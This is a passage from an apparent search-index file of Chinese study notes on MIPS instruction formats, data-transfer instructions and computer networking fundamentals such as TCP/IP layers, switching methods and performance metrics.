MISP\u6307\u4ee4\u7f16\u7801","text":"<p>MISP\u6307\u4ee4\u5168\u90fd\u662f32\u4f4d\u7684\uff08\u8fd9\u548c\u4e4b\u524d\u8bb2\u7684RISC\u7279\u70b9\u76f8\u7b26\uff09\uff0c\u5206\u522b\u4e3ab31~b0\uff08\u4ece\u9ad8\u4f4d\u5230\u4f4e\u4f4d\uff09\uff0c\u800c\u6bcf\u4e2a\u6307\u4ee4\u90fd\u6709\u64cd\u4f5c\u7b26\u548c\u64cd\u4f5c\u6570\uff0c\u90a3\u4e48\u5728MISP\u4e2d\u7684\u6307\u4ee4\u662f\u5982\u4f55\u540c\u65f6\u5305\u542b\u8fd9\u4e9b\u5185\u5bb9\u7684\u5462\uff1f\u9996\u5148\u5bf9\u4e8e\u4e0d\u540c\u7c7b\u578b\u7684\u6307\u4ee4\u80af\u5b9a\u4f1a\u6709\u4e0d\u540c\u7684\u683c\u5f0f\uff0c\u6211\u4eec\u628a\u6307\u4ee4\u4e3b\u8981\u5206\u4e3aR\u578b\u6307\u4ee4\u3001I\u578b\u6307\u4ee4\u3001J\u578b\u6307\u4ee4\u3002</p> <ol> <li> <p>R\u578b\u6307\u4ee4</p> </li> <li> <p>\u7ed3\u6784\uff1a</p> Op Rs Rt Rd Shamt Funct 6 5 5 5 5 6 <ul> <li>Op(operation)\uff1a\u64cd\u4f5c\u7801\uff0c\u8868\u660e\u8be5\u6307\u4ee4\u7684\u57fa\u672c\u529f\u80fd\u3002\u5982add\u3001sub\u7b49</li> <li>Rs\u3001Rt\u3001Rd\uff1a\u5206\u522b\u4e3a\u5404\u4e2a\u5bc4\u5b58\u5668\u7f16\u53f7\u7684\u4e8c\u8fdb\u5236\u7f16\u7801\uff08\u8868\u660e\u5bc4\u5b58\u5668\u5730\u5740\uff09</li> <li>Shamt\uff1a\u79fb\u4f4d\u6307\u4ee4\u79fb\u4f4d\u6b21\u6570\u7acb\u5373\u6570\u7684\u4e8c\u8fdb\u5236\u7f16\u7801\uff0c\u5c31\u65f6\u5728c\u8bed\u8a00\u4f7f\u7528<code>&lt;&lt;</code>\u6216<code>&gt;&gt;</code>\u65f6\u6240\u7528\u5230\u7684\u6307\u4ee4\uff0c\u5982\u679c\u662f\u5176\u4ed6\u6307\u4ee4\uff0c\u5219\u6b64\u5904\u65e0\u610f\u4e49\uff0c\u5904\u7406\u673a\u5c06\u5176\u7f16\u7801\u4f4d\\((00000)_2\\)</li> <li>Funct\uff1a\u529f\u80fd\u7801\uff0c\u76f8\u5f53\u4e8e\u5bf9\u4e8e\u64cd\u4f5c\u7801\u7684\u8be6\u7ec6\u9009\u62e9\uff0c\u6bd4\u5982<code>\u5bc4\u5b58\u5668\u95f4\u63a5\u8df3\u8f6c\u540e\u94fe\u63a5</code>\u3001<code>\u5bc4\u5b58\u673a\u95f4\u63a5\u8df3\u8f6c</code>\u7684\u64cd\u4f5c\u7801\u76f8\u540c\uff0c\u53ef\u662f\u4ed6\u4eec\u7684\u529f\u80fd\u7801\u4e0d\u540c\u3002</li> </ul> </li> <li> <p>\u7528\u4f8b\uff1a</p> <pre><code>add $t0,$s1,$s2#\u5bf9\u4e8e\u6bcf\u4e2a\u5bc4\u5b58\u5668\u5230\u7684\u4e8c\u8fdb\u5236\u8868\u793a\uff0c\u53ef\u4ee5\u4ece\u4e0a\u9762\u7684\u5bc4\u5b58\u5668\u5206\u7c7b\u4e2d\u770b\u51fa\n</code></pre> Op Rs Rt Rd Shamt Funct \\((000000)_2\\) \\((10001)_2\\) \\((10010)_2\\) \\((01000)_2\\) \\((00000)_2\\) \\((100000)_2\\) </li> <li> <p>R\u578b\u6307\u4ee4\u5e38\u89c1Op\u7801\uff1a</p> </li> </ol> <p></p> <ol> <li>I\u578b\u6307\u4ee4</li> </ol> <p>I\u578b\u6307\u4ee4\u4e3a\u6570\u636e\u4f20\u9001\u7c7b\u6307\u4ee4\uff0c\u5c31\u662f\u5bc4\u5b58\u5668\u548c\u5b58\u50a8\u5668\u4e4b\u95f4\u7684\u6570\u636e\u4f20\u9001\u3002\u64cd\u4f5c\u6570\u4e0d\u4ec5\u5305\u542b\u5bc4\u5b58\u5668\uff0c\u8fd8\u5305\u542b\u7acb\u5373\u6570\uff08\u5e38\u6570\uff09\uff0c\u800c\u8fd9\u91cc\u7684\u5e38\u6570\u53ef\u80fd\u5f88\u5927\uff0c\u5982\u679c\u4f7f\u7528R\u578b\u6307\u4ee4\u80af\u5b9a\u662f\u65e0\u6cd5\u8868\u793a\u7684\uff08\u7acb\u5373\u82cf\u88ab\u9650\u5236\u57280~31\uff09\uff0c\u5982\u679c\u5b9a\u4e49\u4e86A[100]\uff0c\u90a3\u4e48\u5bf9\u4e8e\u540e\u9762\u7684\u6570\u636e\u5c31\u65e0\u6cd5\u8bfb\u53d6\u4e86\uff0c\u56e0\u6b64\u9700\u8981\u91cd\u65b0\u8c03\u6574\u4e00\u4e0b\u7ed3\u6784\u3002</p> <ul> <li>\u7ed3\u6784</li> </ul> Op Rs Rt Imm\uff08\u5e38\u6570\u5730\u5740\uff09 6 5 5 16 <ul> <li> <p>\u7528\u4f8b</p> <ul> <li>\u6570\u636e\u4f20\u9001\u6307\u4ee4\u7684\u683c\u5f0f\uff1a<code>Op Rt,Imm(Rs)</code>\uff0c\u4f8b\u5982<code>lw $t0,1200($t1)</code></li> <li>\u6761\u4ef6\u8df3\u8f6c\u7684\u6307\u4ee4\uff1a<code>Op Rs,Rt,Imm</code>,</li> <li>\u5e38\u6570\u53c2\u4e0e\u8fd0\u7b97\u7684\u6307\u4ee4\uff1a<code>Op Rt,Rs,Imm</code>\uff0c\u4f8b\u5982<code>add $s0,$t0,12344</code></li> </ul> </li> <li> <p>J\u578b\u6307\u4ee4\u5e38\u89c1\u6307\u4ee4\u7801\uff1a</p> <p></p> </li> <li> <p>J\u578b\u6307\u4ee4</p> </li> </ul> <p>\u5728\u7a0b\u5e8f\u7ed3\u6784\u4e2d\u5927\u591a\u90fd\u4e0d\u662f\u987a\u5e8f\u6267\u884c\u7684\uff0c\u6709\u5404\u79cd\u5404\u6837\u7684\u7ed3\u6784\uff0c\u56e0\u6b64\u8ba1\u7b97\u673a\u4e2d\u597d\u9700\u8981\u6709\u4f2a\u76f4\u63a5\u8df3\u8f6c\u6307\u4ee4\uff0c\u8fd9\u7c7b\u6307\u4ee4\u5b9e\u73b0\u65e0\u6761\u4ef6\u8df3\u8f6c\uff08\u548cI\u578b\u6307\u4ee4\u6709\u6240\u4e0d\u540c\uff09.</p> <ul> <li> <p>\u7ed3\u6784\uff1a</p> Op \u4f2a\u76f4\u63a5\u8df3\u8f6c\u5730\u5740 6 26 <p>\u4f2a\u76f4\u63a5\u8df3\u8f6c\u5730\u5740\uff1a\u6807\u53f7\u6240\u6307\u5b58\u50a8\u5355\u5143\u7684\u4e2d\u95f426\u4f4d\uff0c\u56e0\u4e3aMISP\u6bcf\u6761\u6307\u4ee4\u90fd\u53604\u4e2a\u5b58\u50a8\u5355\u5143\uff0c\u56e0\u6b64MISP\u5b58\u50a8\u7684\u5730\u5740\u90fd\u662f4\u7684\u500d\u6570\uff08\u6bd4\u5982\u4f2a\u76f4\u63a5\u8df3\u8f6c\u5730\u5740\u503c\u4e3a1\uff0c\u90a3\u4e48\u4ed6\u6240\u53ea\u60f3\u7684\u5c31\u662f\u5f00\u5934\u4e3a4\u7684\u5b58\u50a8\u5355\u5143\uff09\u3002</p> <p>\u8fd9\u79cd\u8df3\u8f6c\u6307\u4ee4\u5b9e\u9645\u4e0a\u8fd8\u662f\u5c5e\u4e8e\u8df3\u8dc3\u5bfb\u5740\u3002\u5982\u679c\u8fd9\u662f\u4e2a32\u4f4d\u673a\uff0c\u90a3\u4e48\u4ed6\u7684\u5730\u5740\u5c31\u5e94\u8be5\u670932\u4f4d\u4e8c\u8fdb\u5236\u8868\u793a\uff0c\u800c\u8fd9\u91cc\u7684\u4f2a\u76f4\u63a5\u8df3\u8f6c\u5730\u5740\u53ea\u670926\u4f4d\uff0c\u548b\u529e\uff1f\u90a3\u4e48\u6211\u4eec\u5c31\u9700\u8981\u5c06\u5b83\u7a7a\u5145\u523032\u4f4d\uff0c\u9996\u5148\u5728\u4f2a\u76f4\u63a5\u8df3\u8f6c\u5730\u5740\u540e\u9762\u52a0\u4e24\u4e2a0\uff08\u56e0\u4e3a\u6307\u4ee4\u90fd\u662f4\u4e2a\u5b57\u8282\u7684\uff09\uff0c\u7136\u540e\u518d\u8bb2PC\u9ad84\u4f4d\u53d6\u8fc7\u6765\u5f53\u505a\u4ed6\u7684\u9ad8\u56db\u4f4d\u3002</p> PC\u9ad8\u56db\u4f4d \u4e3a\u76f4\u63a5\u8df3\u8f6c\u5730\u5740 \u6307\u4ee4\u90fd\u662f4\u5b57\u8282\uff0c\u8865\u4e24\u4e2a0 4 26 2 </li> <li> <p>\u5e38\u89c1J\u578b\u6307\u4ee4\u6307\u4ee4\u7801\uff1a</p> <p></p> </li> </ul>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#27","title":"2.7\u6570\u636e\u4f20\u9001\u6307\u4ee4","text":"<p>MISP\u6307\u4ee4\u96c6\u4e2d\u63d0\u4f9b\u5e38\u7528\u7684\u6570\u636e\u4f20\u9001\u6307\u4ee4\uff0c\u5305\u62ec\u5b58\u50a8\u5668\u5230\u901a\u7528\u5bc4\u5b58\u5668\u3001\u901a\u7528\u5bc4\u5b58\u5668\u5230\u5b58\u50a8\u5668\u3001\u901a\u7528\u5bc4\u5b58\u5668\u5230\u7279\u6b8a\u5bc4\u5b58\u5668\u3001\u7279\u6b8a\u5bc4\u5b58\u5668\u5230\u901a\u7528\u5bc4\u5b58\u5668\u4ee5\u53ca\u7acb\u5373\u6570\u5230\u901a\u7528\u5bc4\u5b58\u5668\u7684\u6570\u636e\u4f20\u9001\u6307\u4ee4\u3002</p> <ol> <li>\u5b58\u50a8\u5668\u5230\u901a\u7528\u5bc4\u5b58\u5668\uff08\u88c5\u8f7dload\uff09</li> </ol> <p>\u88c5\u8f7d\u7684\u6307\u4ee4\u90fd\u662f\u4ee5\u201cl\u201d\u5f00\u5934\u7684\uff0c\u5177\u4f53\u540e\u9762\u7684\u5c31\u662f\u5bf9\u4e8e\u88c5\u8f7d\u7684\u8981\u6c42\uff0c\u4f8b\u5982\uff1a</p> <p><code>lbu $Rt, Imm( $Rs)</code></p> <p>b\u6307\u7684\u662f\u5b57\u8282\uff08byte\uff09\u4f20\u9001\uff1bu\u6307\u7684\u662f\u65e0\u7b26\u53f7\u6269\u5c55\u3002\u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u4e9b\u6307\u4ee4\u90fd\u662fI\u578b\u6307\u4ee4\u3002\u8fd9\u53c8\u590d\u4e60\u4e86\u4e00\u904d\u6211\u4eec\u4e4b\u524d\u5b66\u7684\u77e5\u8bc6\u70b9\u3002</p> <p>\u5177\u4f53\u8fd8\u6709\u90a3\u4e9b\u64cd\u4f5c\u7b26\uff1a</p> \u7b26\u53f7 \u542b\u4e49 <code>b</code> \u6309\u5b57\u8282\uff08byte\uff09\u4f20\u8f93(\u4ee5\u5b57\u8282) <code>u</code> \u65e0\u7b26\u53f7\u6269\u5c55 <code>w</code> \u6309\u5b57\uff08word\uff09\u4f20\u8f93\uff084\u5b57\u8282\uff09 <code>h</code> \u6309\u534a\u5b57\uff08half word\uff09\u4f20\u8f93\uff082\u5b57\u8282\uff09 <code>r</code> \u4ee5\u5f53\u524d\u7684\u5730\u5740\u6700\u4e3a\u53f3\u8fb9\u754c\uff0c\u5411\u5de6\u8fdb\u884c\u4f20\u8f93 <code>l</code> \u4ee5\u5f53\u524d\u7684\u5730\u5740\u6700\u4e3a\u5de6\u8fb9\u754c\uff0c\u5411\u53f3\u8fdb\u884c\u4f20\u8f93 <ol> <li>\u901a\u7528\u5bc4\u5b58\u5668\u5230\u5b58\u50a8\u5668\uff08\u5b58\u50a8store\uff09</li> </ol>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/","title":"\u8ba1\u7b97\u673a\u7f51\u7edc","text":""},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/#tcpip","title":"TCP/IP\u6a21\u578b","text":"\u5c42\u7ea7 \u6837\u4f8b \u5e94\u7528\u5c42 \u57fa\u4e8eTCP\uff1a[HTTP\u3001HTTPS\u3001SMTP\u3001FTP\u3001SSH]\u57fa\u4e8eUDP\uff1a[DNS\u3001RTP] \u4f20\u8f93\u5c42 TCP\u3001UDP\u3001(SCTP) \u7f51\u9645\u5c42\uff08\u7f51\u7edc\u5c42\uff09 IPv4\u3001IPv6\u3001ARP\u3001ICMP \u7f51\u7edc\u63a5\u53e3\u5c42[\u6570\u636e\u94fe\u8def\u5c42&amp;\u7269\u7406\u5c42] [\u4ee5\u592a\u7f51\u3001\u7f51\u7ebfLAN] [\u5149\u7ea4\u3001\u53cc\u7ede\u7ebf\u7535\u7f06\u3001\u65e0\u7ebf\u8bbe\u5907] <p>\u5728\u7f51\u7edc\u4f53\u7cfb\u4e2d\uff0c\u4e3b\u673a\u4e00\u822c\u5305\u542b\u5b8c\u6574\u7684TCP/IP\u534f\u8bae\u7c07\uff0c\u4e5f\u5c31\u662f\u5b8c\u6574\u7684TCP/IP\u76844\u5c42\u7ed3\u6784\uff1b\u800c\u5bf9\u4e8e\u7f51\u7edc\u7f51\u7edc\u4e2d\u7684\u4ea4\u6362\u8282\u70b9\u6765\u8bf4\uff0c\u53ea\u9700\u8981\u5305\u542b\u7f51\u9645\u5c42\u548c\u7f51\u7edc\u63a5\u53e3\u5c42\u5373\u53ef\u3002</p>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/#_2","title":"\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u4ea4\u6362\u6280\u672f","text":"<ul> <li>\u7535\u8def\u4ea4\u6362\u6280\u672f</li> </ul> <p>\u4ea4\u6362\u524d\u53ea\u8fdb\u884c\u4e00\u6b21\u8fde\u63a5\uff0c\u4ea4\u6362\u8fc7\u7a0b\u4e2d\u6301\u7eed\u5360\u6709\u901a\u4fe1\u8d44\u6e90\uff0c\u77e5\u9053\u4ea4\u6362\u7ed3\u675f\u662f\u91ca\u653e\u8d44\u6e90\u6b64\u8fc7\u7a0b\u4e2d\uff0c\u53cc\u65b9\u90fd\u65e0\u6cd5\u4e0e\u7b2c\u4e09\u4e3b\u673a\u901a\u4fe1\u3002</p> <p>\u8fd9\u79cd\u901a\u4fe1\u65b9\u5f0f\u5b89\u5168\u6027\u9ad8\uff0c\u540c\u65f6\u51cf\u5c11\u8fde\u63a5\u6240\u9700\u8981\u7684\u65f6\u95f4\u6d88\u8017\uff08\u4e4b\u8fde\u63a5\u4e00\u6b21\uff09\u3002\u4f46\u662f\u591a\u7ebf\u7a0b\u901a\u4fe1\u4e0d\u53ef\u5b9e\u73b0\uff0c\u96be\u4ee5\u548c\u591a\u53f0\u4e3b\u673a\u4ea4\u4e92\u3002\u5728\u8001\u5f0f\u7684\u7535\u8bdd\u901a\u4fe1\u4e2d\u4f7f\u7528\u8fd9\u79cd\u6280\u672f\u3002</p> <ul> <li>==\u5206\u7ec4\u4ea4\u6362\u6280\u672f==\u6700\u5e38\u7528</li> </ul> <p>\u4ea4\u6362\u524d\uff0c\u53d1\u9001\u7aef\u5148\u6839\u636e\u8981\u6c42\u5c06\u76ee\u6807\u6570\u636e\u6309\u4e00\u5b9a\u5927\u5c0f\u5206\u7ec4\uff0c\u540c\u65f6\u52a0\u4e0a\u9996\u90e8\uff08\u8868\u793a\u76ee\u6807\u4e3b\u673a\u4fe1\u606f\uff09\u3002</p> <p>\u6ca1\u6709\u5efa\u7acb\u8fde\u63a5\u548c\u91ca\u653e\u8fde\u63a5\u7684\u8fc7\u7a0b\uff0c\u5207\u5bf9\u4e8e\u7f51\u7edc\u5177\u6709\u8f83\u9ad8\u7684\u9002\u7528\u6027\uff0c\u4e0d\u4f1a\u56e0\u4e3a\u7f51\u7edc\u7684\u6ce2\u52a8\u5bfc\u81f4\u6570\u636e\u5168\u90e8\u91cd\u65b0\u53d1\u9001\uff1b\u5bf9\u4e8e\u6570\u636e\u91cd\u53d1\u5177\u6709\u5341\u5206\u660e\u663e\u7684\u4f18\u52bf\uff0c\u8fd8\u53ef\u4ee5\u53ef\u4ee5\u5b9e\u73b0\u591a\u4e3b\u673a\u540c\u65f6\u901a\u4fe1\u3002\u5177\u6709\u8f83\u9ad8\u7684\u901a\u4fe1\u7ebf\u8def\u5229\u7528\u7387\u3002\u4f46\u662f\u56e0\u4e3a\u6dfb\u52a0\u4e86\u9996\u90e8\uff0c\u589e\u52a0\u4e86\u989d\u5916\u7684\u4f20\u8f93\u5f00\u9500\uff0c\u4ea4\u6362\u8282\u70b9\u7684\u5b58\u50a8\u548c\u8f6c\u53d1\u4f1a\u9020\u6210\u4e00\u5b9a\u7684\u5ef6\u65f6\uff0c\u901a\u4fe1\u91cf\u5927\u65f6\uff0c\u53ef\u80fd\u9020\u6210\u7f51\u7edc\u62e5\u5835\u3002\u5206\u7ec4\u53ef\u80fd\u51fa\u73b0\u5931\u5e8f\u548c\u4e22\u5931\u7684\u95ee\u9898\u3002</p> <ul> <li>\u62a5\u6587\u4ea4\u6362\u6280\u672f</li> </ul> <p>\u62a5\u6587\u4ea4\u6362\u65f6\u5206\u7ec4\u4ea4\u6362\u7684\u524d\u8eab\uff0c\u4f46\u662f\u62a5\u6587\u4ea4\u6362\u8981\u6c42\u8f6c\u53d1\u8282\u70b9\u5fc5\u987b\u5728\u5168\u90e8\u63a5\u53d7\u5b8c\u6570\u636e\u540e\u624d\u53ef\u4ee5\u7ee7\u7eed\u8f6c\u53d1\u3002</p> <p>\u62a5\u6587\u4ea4\u6362\u6280\u672f\u5bf9\u4e8e\u4ea4\u6362\u8282\u70b9\u7684\u7f13\u5b58\u8981\u6c42\u6bd4\u8f83\u9ad8\uff0c\u4f46\u662f\u5bf9\u4e8e\u6570\u636e\u7684\u5b8c\u6574\u6027\u6709\u4fdd\u969c\u3002\u5bf9\u4e8e\u4e3b\u673a\u8d44\u6e90\u6709\u4e00\u5b9a\u7684\u8282\u7701\u3002\u4f20\u8f93\u901f\u5ea6\u76f8\u5bf9\u8f83\u6162\uff0c\u867d\u7136\u7701\u53bb\u4e86\u5206\u7ec4\u7684\u65f6\u95f4\u548c\u7a7a\u95f4\uff0c\u4f46\u662f\u7531\u4e8e\u5176\u89c4\u5219\uff0c\u8f6c\u53d1\u8282\u70b9\u7684\u5de5\u4f5c\u6548\u7387\u4f1a\u5341\u5206\u4f4e\u4e0b\u3002</p>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/#_3","title":"\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u6027\u80fd\u6307\u6807","text":"<ol> <li>\u901f\u7387</li> <li>\u901f\u7387\u662f\u6307\u6570\u636e\u4f20\u8f93\u7684\u901f\u7387\uff08\u5373\u6bcf\u79d2\u4f20\u9001\u591a\u5c11\u6bd4\u7279\uff09\uff0c\u4e5f\u79f0\u4e3a\u6570\u636e\u7387\u6216\u6bd4\u7279\u7387\u3002</li> <li>\u901f\u7387\u7684\u57fa\u672c\u5355\u4f4d\uff1a<code>bit/s(b/s,bps)</code>\uff1b\u5e38\u7528\u5355\u4f4d\uff1a<code>Kb/s</code>,<code>Mb/s</code>,<code>Gb/s</code>,<code>Tb/s</code></li> <li> <p>\u6570\u636e\u91cf\u7684\u5355\u4f4d\u4e2d\u63092\u7684\u6307\u6570\u9012\u589e\uff0c\u901f\u7387\u7684\u5355\u4f4d\u4e2d\u630910\u7684\u6307\u6570\u9012\u589e\u3002</p> </li> <li> <p>\u5e26\u5bbd</p> </li> <li>\u5e26\u5bbd\u5728\u6a21\u62df\u4fe1\u53f7\u7cfb\u7edf\u4e2d\u7684\u610f\u4e49\uff1a\u67d0\u4e2a\u4fe1\u53f7\u6240\u5305\u542b\u7684\u5404\u79cd\u4e0d\u540c\u9891\u7387\u6210\u5206\u6240\u5360\u636e\u7684\u9891\u7387\u8303\u56f4\u3002\u5355\u4f4d\uff1a<code>Hz</code>(<code>kHz</code>,<code>mHz</code>,<code>GHz</code>).</li> <li> <p>\u5e26\u5bbd\u5728\u8ba1\u7b97\u673a\u7f51\u7edc\u4e2d\u7684\u610f\u4e49\uff1a\u7528\u6765\u8868\u793a\u7f51\u7edc\u7684\u901a\u884c\u7ebf\u8def\u6240\u80fd\u4f20\u8f93\u6570\u636e\u7684\u80fd\u529b\uff0c\u5373\u5728\u5355\u4f4d\u65f6\u95f4\u5185\u4ece\u7f51\u7edc\u7684\u67d0\u4e00\u8282\u70b9\u5230\u53e6\u4e00\u8282\u70b9\u6240\u80fd\u901a\u8fc7\u7684\u6700\u9ad8\u901f\u7387\u3002\u5355\u4f4d\u548c\u901f\u7387\u7684\u5355\u4f4d\u76f8\u540c\u3002</p> </li> <li> <p>\u541e\u5410\u91cf</p> </li> <li>\u541e\u5410\u91cf\u662f\u6307\u5728\u5355\u4f4d\u65f6\u95f4\u5185\u901a\u8fc7\u67d0\u4e2a\u7f51\u7edc\u6216\u63a5\u53e3\u7684\u5b9e\u9645\u6570\u636e\u91cf\u3002\u541e\u5410\u91cf\u5e38\u88ab\u7528\u4e8e\u5b9e\u9645\u7f51\u7edc\u7684\u6d4b\u91cf\uff0c\u4e00\u5355\u4f4d\u65f6\u95f4\u5185\u5230\u5e95\u6709\u591a\u5c11\u6570\u636e\u901a\u8fc7\u7f51\u7edc\u3002</li> <li> <p>\u541e\u5410\u91cf\u53d7\u7f51\u7edc\u5e26\u5bbd\u7684\u9650\u5236\u3002</p> </li> <li> <p>\u65f6\u5ef6</p> </li> <li> <p>\u901a\u4fe1\u65f6\u5ef6\u5305\u62ec\u6392\u961f\u65f6\u5ef6\u3001\u5904\u7406\u65f6\u5ef6\u3001\u53d1\u9001\u65f6\u5ef6\u548c\u4f20\u64ad\u65f6\u5ef6</p> </li> <li> <p>\u53d1\u9001\u65f6\u5ef6 = \u5206\u7ec4\u957f\u5ea6(b) / \u53d1\u9001\u901f\u7387 (b/s)</p> </li> <li>\u4f20\u64ad\u65f6\u5ef6 = \u901a\u4fe1\u957f\u5ea6(m) / \u4fe1\u53f7\u4f20\u64ad\u901f\u7387 (m/s)</li> <li> <p>\u5e38\u89c1\u4fe1\u53f7\u4f20\u64ad\u901f\u7387\uff1a\u81ea\u7531\u7a7a\u95f4\uff08\u5149\u901f\uff09&gt; \u94dc\u7ebf &gt; \u5149\u7ea4\uff08PS\uff1a\u5149\u7ea4\u4e0a\u7f51\u5feb\u662f\u56e0\u4e3a\u5e26\u5bbd\u5927\uff09</p> </li> <li> <p>\u5ef6\u65f6\u5e26\u5bbd\u79ef</p> </li> <li>\u5ef6\u65f6\u5e26\u5bbd\u79ef\u662f\u4f20\u64ad\u5ef6\u65f6\u548c\u5e26\u5bbd\u7684\u4e58\u79ef\uff0c\u53cd\u6620\u7684\u4f9d\u65e7\u662f\u5728\u4f20\u8f93\u94fe\u8def\u4e2d\u53ef\u80fd\u5b58\u5728\u7684\u6700\u5927\u7684\u6570\u636e\u91cf\u3002</li> <li> <p>\u94fe\u8def\u7684\u5ef6\u65f6\u5e26\u5bbd\u79ef\u53c8\u79f0\u4e3a\u4ee5\u6bd4\u7279\u4e3a\u5355\u4f4d\u7684\u94fe\u8def\u957f\u5ea6</p> </li> <li> <p>\u5f80\u8fd4\u65f6\u95f4\uff08RTT\uff09</p> </li> <li>\u5f80\u8fd4\u65f6\u95f4\u662f\u6307\u901a\u4fe1\u53cc\u65b9\u53cc\u5411\u4ea4\u4e92\u4e00\u6b21\u6240\u8017\u8d39\u7684\u65f6\u95f4</li> <li> <p>\u53ef\u4ee5\u4f7f\u7528<code>ping</code>\u547d\u4ee4\u6216\u8005\u7f51\u7edc\u5de5\u5177\u6d4b\u8bd5\u5f80\u8fd4\u65f6\u95f4</p> </li> <li> <p>\u5229\u7528\u7387</p> </li> <li>\u4fe1\u9053\u5229\u7528\u7387\uff1a\u7528\u6765\u8868\u793a\u67d0\u4fe1\u9053\u6709\u767e\u5206\u4e4b\u79ef\u7684\u65f6\u95f4\u6709\u6570\u636e\u901a\u8fc7</li> <li>\u7f51\u7edc\u5229\u7528\u7387\uff1a\u5168\u7f51\u7edc\u7684\u4fe1\u9053\u5229\u7528\u7387\u7684\u52a0\u6743\u5e73\u5747\u503c</li> <li>\u5229\u7528\u7387\u5e76\u975e\u8d8a\u9ad8\u8d8a\u597d\uff1a\u4fe1\u9053\u5229\u7528\u7387\u548c\u4fe1\u9053\u65f6\u5ef6\u6210\u53cd\u76f8\u5173\uff1a\\(D=D_0\\over{1-U}\\)</li> <li> <p>\u4e00\u822c\u8fd0\u8425\u5546\uff08ISP\uff0cInternet Service Provider\uff09\u4f1a\u5c06\u5229\u7528\u7387\u63a7\u5236\u5728\u767e\u5206\u4e4b50\u4ee5\u4e0b\uff0c\u4ee5\u907f\u514d\u5927\u89c4\u6a21\u7684\u7f51\u7edc\u62e5\u5835\u3002</p> </li> <li> <p>\u4e22\u5305\u7387</p> </li> <li>\u4e22\u5305\u7387\u662f\u5728\u4e00\u5b9a\u65f6\u95f4\u8303\u56f4\u5185\uff0c\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u5bf9\u662f\u7684\u5206\u7ec4\u6570\u91cf\u548c\u603b\u5206\u7ec4\u6570\u91cf\u7684\u6bd4\u7387</li> <li>\u5206\u7ec4\u4e22\u5f03\u4e3b\u8981\u6709\u4e24\u4e2a\u539f\u56e0\uff1a\u5206\u7ec4\u8bef\u7801\u88ab\u8282\u70b9\u4ea4\u6362\u673a\u4e22\u5f03\uff1b\u8282\u70b9\u4ea4\u6362\u673a\u7684\u4e3b\u52a8\u4e22\u5305\u7b56\u7565</li> <li>\u4e22\u5305\u53cd\u5e94\u7f51\u7edc\u7684\u62e5\u585e\u7a0b\u5ea6\u3002</li> </ol>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/#tcpip_1","title":"TCP/IP\u6a21\u578b\u4e2d\u5404\u5c42\u7684\u4f5c\u7528","text":"<ol> <li> <p>\u7269\u7406\u5c42</p> </li> <li> <p>\u4e3b\u8981\u8d1f\u8d23\u7f51\u7edc\u4f20\u8f93\u4e2d\u7684\u7269\u7406\u63a5\u53e3\u3001\u6bd4\u7279\u8868\u793a\u3001\u4f20\u8f93\u4ecb\u8d28\u7b49\u7269\u7406\u5c42\u9762\u7684\u57fa\u7840\u95ee\u9898\uff1b</p> </li> <li> <p>\u6839\u672c\u7684\u51b3\u5b9a\u4e86\u7f51\u7edc\u7684\u8d28\u91cf</p> </li> <li> <p>\u6570\u636e\u94fe\u8def\u5c42</p> </li> <li> <p>\u6807\u8bc6\u7f51\u7edc\u4e3b\u673a\uff08\u4e3b\u673a\u7f16\u5740\uff0c\u5982MAC\u5730\u5740\u7f16\u7801\uff09\u901a\u5e38\u6570\u636e\u5305\u524d\u9762\u4f1a\u5b58\u5728\u4e00\u6bb5\u6e90\u4e3b\u673a\u4fe1\u606f\u548c\u76ee\u6807\u4e3b\u673a\u4fe1\u606f\uff0c\u8fd9\u6d89\u53ca\u5230\u5e38\u7528\u7684 ARP*\u534f\u8bae\uff0c</p> </li> <li> <p>\u672c\u5c42\u8fd8\u8981\u89e3\u51b3\u533a\u5206\u6570\u636e\u5305\u4e2d\u5730\u5740\u548c\u6570\u636e\uff08\u6570\u636e\u5c01\u88c5\u683c\u5f0f\uff09</p> </li> <li> <p>\u534f\u8c03\u5404\u4e3b\u673a\u4e89\u7528\u603b\u7ebf\uff08\u5a92\u4f53\u63a5\u5165\u63a7\u5236\uff09[\u51e0\u4e4e\u88ab\u6dd8\u6c70]| \u4ee5\u592a\u7f51\u4ea4\u6362\u673a\u7684\u5b9e\u73b0\uff08\u81ea\u5b66\u4e60\u548c\u8f6c\u53d1\u5e27\uff09</p> </li> <li> <p>\u68c0\u6d4b\u6570\u636e\u662f\u5426\u8bef\u7801\uff08\u5dee\u9519\u68c0\u6d4b\uff09</p> </li> <li> <p>\u51fa\u73b0\u4f20\u8f93\u5dee\u9519\u5982\u4f55\u5904\u7406\uff08\u53ef\u9760\u4f20\u8f93\u548c\u4e0d\u53ef\u9760\u4f20\u8f93\uff09</p> </li> <li> <p>\u63a5\u6536\u65b9\u63a7\u5236\u53d1\u9001\u65b9\u6ce8\u5165\u7f51\u7edc\u7684\u6570\u636e\u91cf\uff08\u6d41\u91cf\u63a7\u5236\uff09</p> </li> <li> <p>\u7f51\u9645\u5c42</p> </li> <li> <p>\u6807\u8bc6\u7f51\u7edc\u548c\u7f51\u7edc\u4e2d\u5404\u4e3b\u673a\uff08\u7f51\u7edc\u548c\u4e3b\u673a\u5171\u540c\u7f16\u5740\uff0c\u5982IP\u5730\u5740\uff09</p> </li> <li> <p>\u8def\u7531\u5668\u8f6c\u53d1\u5206\u7ec4\uff08\u8def\u7531\u9009\u62e9\u534f\u8bae\u3001\u8def\u7531\u8868\u548c\u8f6c\u53d1\u8868\uff09</p> </li> <li> <p>\u4f20\u8f93\u5c42</p> </li> <li> <p>\u8fdb\u7a0b\u4e4b\u95f4\u57fa\u4e8e\u7f51\u7edc\u7684\u901a\u4fe1\uff08\u8fdb\u7a0b\u6807\u8bc6\uff0c\u5982\u7aef\u53e3\u53f7\uff09</p> </li> <li> 